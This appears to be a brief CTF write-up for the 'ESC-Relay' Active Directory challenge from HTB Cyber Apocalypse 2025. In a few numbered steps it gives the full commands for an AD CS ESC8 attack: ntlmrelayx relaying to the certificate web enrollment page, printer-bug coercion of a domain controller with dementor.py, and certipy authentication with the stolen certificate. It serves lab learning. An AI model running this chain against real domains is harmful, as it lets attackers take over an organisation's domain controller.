---
layout: page
title: "ESC-Relay - HTB Cyber Apocalypse 2025 Writeup"
subtitle: "Exploit AD CS ESC8 vulnerability. Coerce HTTP NTLM authentication from a domain controller using MS-RPRN Printer Bug, and relay it to the AD CS Web Enrollment endpoint to request a Domain Admin certificate."
permalink: /ctf/writeups/challenges/active-directory/esc-relay/
category: "active-directory"
challenge_name: "ESC-Relay"
difficulty: "Hard"
event: "HTB Cyber Apocalypse 2025"
points: "480"
solves: "34"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: HTB Cyber Apocalypse 2025
* **Difficulty**: Hard
* **Points**: 480
* **Solves**: 34
* **Category**: Active Directory
* **Tags**: AD CS, ESC8, NTLM Relaying, Printer Bug, Coercion

---

## 📝 Description
Exploit AD CS ESC8 vulnerability. Coerce HTTP NTLM authentication from a domain controller using MS-RPRN Printer Bug, and relay it to the AD CS Web Enrollment endpoint to request a Domain Admin certificate.

---

## 💡 Solution / Approach
1. Start NTLM relaying tool listening on HTTP and targeting the AD CS web enrollment page: `ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`.

2. Coerce authentication from the target DC (`DC-01`) using the printer bug: `dementor.py 10.10.10.5 10.10.10.10` (relaying listener is at 10.10.10.5, DC is at 10.10.10.10).

3. Capture the relayed connection from the DC, request the certificate, and download the base64-encoded PFX certificate.

4. Request a TGT ticket using the certificate to assume DC authority: `certipy auth -pfx dc-01.pfx -dc-ip 10.10.10.10`.
